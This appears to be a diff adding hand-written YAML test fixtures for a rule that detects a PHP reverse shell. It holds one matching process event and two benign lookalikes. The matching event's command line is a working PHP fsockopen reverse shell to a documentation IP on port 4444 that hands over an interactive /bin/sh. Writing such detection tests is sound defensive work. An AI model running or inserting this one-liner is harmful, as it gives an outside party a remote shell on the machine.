@@ -1,0 +1,12 @@
+# Hand-written fixtures (the converter does not generate them); values are invented.
+match:
+  - desc: "php fsockopen reverse shell"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24101, "ppid": 24090, "exe": "/usr/bin/php8.1", "name": "php8.1", "uid": -1, "euid": -1, "username": "www-data", "cmdline": "php -r $sock=fsockopen(\"198.51.100.20\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");", "parent": {"pid": 24090, "exe": "/usr/bin/bash", "name": "bash"}}}
+nomatch:
+  - desc: "benign lookalike - php -r prints a version"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24110, "ppid": 24090, "exe": "/usr/bin/php8.1", "name": "php8.1", "uid": -1, "euid": -1, "username": "root", "cmdline": "php -r echo phpversion();", "parent": {"pid": 24090, "exe": "/usr/bin/bash", "name": "bash"}}}
+  - desc: "php runs an application"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24111, "ppid": 24090, "exe": "/usr/bin/php8.1", "name": "php8.1", "uid": -1, "euid": -1, "username": "www-data", "cmdline": "php artisan queue:work", "parent": {"pid": 24090, "exe": "/usr/bin/bash", "name": "bash"}}}
